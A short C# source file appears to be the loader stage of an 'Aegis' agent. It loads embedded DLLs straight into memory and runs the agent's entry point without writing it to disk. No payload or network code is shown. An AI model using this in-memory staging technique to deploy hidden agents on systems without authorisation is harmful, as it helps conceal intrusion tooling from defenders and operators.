using Aegis.Models.Interfaces;
using System.Reflection;
using System.Runtime.Loader;

namespace Aegis.Loader
{
    public class AgentLoader : ILoader
    {
        public async Task Go()
        {
            await Load();
        }
        public async Task Load()
        {
            List<string> excludedDlls = new List<string>() {"Agent.dll","Agent.Models.dll" };
            var alc = AssemblyLoadContext.Default;
            var asmExe = Assembly.GetExecutingAssembly();
            Console.WriteLine("Getting Executing Assembly.");
            if (asmExe == null)
            {
                return;
            }
            Console.WriteLine("Getting Models Dll");

            //Gotta load this one first since all the others basically rely on it
            Stream modelStream = asmExe.GetManifestResourceStream("Aegis.Loader.Plaintext.Agent.Models.dll");

            if (modelStream == null)
            {
                return;
            }

            alc.LoadFromStream(modelStream);

            //Load the rest of the DLLs except for the agent
            foreach (string aa in asmExe.GetManifestResourceNames())
            {
                if (excludedDlls.Contains(aa))
                {
                    continue;
                }
                Console.WriteLine($"Loading {aa}");
                Stream s = asmExe.GetManifestResourceStream(aa);
                if (s != null)
                {
                    alc.LoadFromStream(s);
                }
            }
            Console.WriteLine($"Loading Agent");
            // Get the entry point method
            Stream ad = asmExe.GetManifestResourceStream("Aegis.Loader.Plaintext.Agent.dll");
            Assembly agent;
            if (ad == null)
            {
                return;
            }
            agent = alc.LoadFromStream(ad);
            MethodInfo entryPoint = agent.EntryPoint;

            // Invoke the entry point method
            object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
            Console.WriteLine("Executing Agent.");
            entryPoint.Invoke(null, null);
        }
    }
}
